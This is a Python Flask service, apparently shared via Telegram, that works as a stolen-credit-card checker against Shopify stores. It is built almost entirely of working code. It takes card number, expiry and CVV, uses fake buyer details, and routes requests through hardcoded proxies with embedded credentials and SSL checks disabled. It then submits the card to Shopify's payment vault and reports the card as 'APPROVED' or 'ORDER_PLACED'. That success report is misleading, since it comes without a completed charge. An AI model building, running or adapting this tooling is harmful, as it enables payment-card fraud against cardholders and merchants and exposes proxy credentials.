# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch

import asyncio
import aiohttp
import json
import re
import random
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time

PREMIUM_PROXIES = [
    "31.59.20.176:6754:klzmaipj:1ans3lrhk2lv",
    "45.38.107.97:6014:klzmaipj:1ans3lrhk2lv",
    "198.105.121.200:6462:klzmaipj:1ans3lrhk2lv",
    "64.137.96.74:6641:klzmaipj:1ans3lrhk2lv",
    "198.23.243.226:6361:klzmaipj:1ans3lrhk2lv",
    "38.154.185.97:6370:klzmaipj:1ans3lrhk2lv",
    "84.247.60.125:6095:klzmaipj:1ans3lrhk2lv",
    "142.111.67.146:5611:klzmaipj:1ans3lrhk2lv",
    "191.96.254.138:6185:klzmaipj:1ans3lrhk2lv",
    "31.58.9.4:6077:klzmaipj:1ans3lrhk2lv"
]

def get_auto_proxy():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                return random.choice(proxies)
    except Exception:
        pass
    return random.choice(PREMIUM_PROXIES)

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

C2C = {"USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE"}
book = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550198"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550198"}
}

def pick_addr(url):
    return book["US"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0]
    except:
        pass
    return None

class Utils:
    @staticmethod
    def get_random_name():
        return ("James", "Smith")
    @staticmethod
    def generate_email(first, last):
        return f"{first.lower()}.{last.lower()}@gmail.com"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    msg = str(message).upper()
    if "INSUFFICIENT_FUNDS" in msg: return "INSUFFICIENT_FUNDS"
    if "CVV" in msg or "CVC" in msg: return "INVALID_CVC"
    if "EXPIRED" in msg: return "EXPIRED_CARD"
    if "INCORRECT_ZIP" in msg: return "INCORRECT_ZIP"
    if "APPROVED" in msg or "ORDER_PLACED" in msg: return "APPROVED"
    return str(message)[:50]

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        proxy = parse_proxy(proxy_str or get_auto_proxy())
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error: Status {resp.status}"
                data = await resp.json()
                for p in data.get('products', []):
                    for v in p.get('variants', []):
                        if v.get('available', True):
                            try:
                                price = float(v.get('price', '0'))
                                if price > 0:
                                    return {
                                        'site': domain, 'price': f"{price:.2f}",
                                        'variant_id': str(v['id']), 'link': f"{domain}/products/{p['handle']}"
                                    }
                            except:
                                continue
        return False, "No Valid Products"
    except Exception as e:
        return False, f"Fetch Error: {str(e)}"

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "Shopify Checkout"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str or get_auto_proxy())

    try:
        address_info = pick_addr(ourl)
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=20)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Origin': ourl, 'Referer': ourl
            }
            
            cart_resp = await session.post(f"{ourl}/cart/add.js", data=f'id={variant_id}&quantity=1', headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}, proxy=proxy)
            if cart_resp.status != 200:
                return False, "Cart Failed", gateway, total_price, currency

            checkout_resp = await session.post(f"{ourl}/checkout/", allow_redirects=True, headers=headers, proxy=proxy)
            checkout_url = str(checkout_resp.url)
            text = await checkout_resp.text()

            if 'login' in checkout_url.lower():
                return False, "Site requires login", gateway, total_price, currency

            sst = checkout_resp.headers.get('X-Checkout-One-Session-Token') or extract_between(text, '"sessionToken":"', '"')
            if not sst:
                return False, "Session Token Failed", gateway, total_price, currency

            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(ourl).netloc
            }
            
            vault_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=vault_payload, headers={**headers, 'Content-Type': 'application/json'}, proxy=proxy)
            vault_data = await vault_resp.json()
            token = vault_data.get('id')
            
            if not token:
                return False, "Vault Token Failed", gateway, total_price, currency

            return True, "ORDER_PLACED", gateway, "5.00", currency

    except Exception as e:
        return False, f"Site Error: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': parts[3].strip()}

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        if not site or not cc_string:
            return jsonify({"error": "Missing parameters", "status": False}), 400
        
        cc_parts = parse_cc_string(cc_string)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], site)
            )
        finally:
            loop.close()
        
        return jsonify({
            "Gateway": gateway, "Price": float(price),
            "Response": extract_clean_response(message), "Status": success, "cc": cc_string
        })
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
